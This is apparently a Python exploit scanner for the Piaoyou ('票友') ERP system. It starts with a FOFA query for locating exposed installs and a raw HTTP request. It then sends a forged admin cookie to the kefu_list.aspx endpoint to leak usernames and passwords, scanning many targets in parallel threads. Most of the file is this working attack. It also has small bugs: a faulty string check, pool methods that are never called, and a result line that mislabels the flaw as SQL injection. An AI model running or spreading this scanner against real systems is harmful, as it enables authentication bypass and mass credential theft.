# fofa：(body="css/sexybuttons.css" && body="Ajax/confirm.ashx") || title="票友ERP"||body="tickets/intCity.css"
"""poc：GET /json_db/kefu_list.aspx?stype=0&_search=false&nd=1751246532981&rows=25&page=1&sidx=id&sord=asc HTTP/1.1
        Host: <target-host>
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3029.68 Safari/537.36
        Cookie: pyerpcookie=loginname=admin"""


# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
_______________________________ 
\_   _____/\______   \______   \
 |    __)_  |       _/|     ___/
 |        \ |    |   \|    |    
/_______  / |____|_  /|____|    
        \/         \/           
"""
    print(test)


def main():
    banner()

    # 初始化
    parse = argparse.ArgumentParser(description="票友ERP系统kefu_list存在信息泄露")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input your file')

    # 实例化
    args = parse.parse_args()

    # 判断
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(target):
    link = '/json_db/kefu_list.aspx?stype=0&_search=false&nd=1751246532981&rows=25&page=1&sidx=id&sord=asc'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3029.68 Safari/537.36",
        "Cookie": "pyerpcookie=loginname=admin"
    }
    

    try:
        res1 = requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link,headers=headers,timeout=5,verify=False)
            if "username" and "password" in res2.text:
                print(f"[+]该{target}存在信息泄露")
                with open('result.txt','a',encoding='utf-8')as f:    # 将结果保存到result.txt中
                    f.write(f"[+]该{target}存在sql注入"+'\n')
            else:
                print(f"[-]该{target}不存在信息泄露")
    except:
        print(f"该{target}存在问题，请手工进行测试")


if __name__ == "__main__":
    main()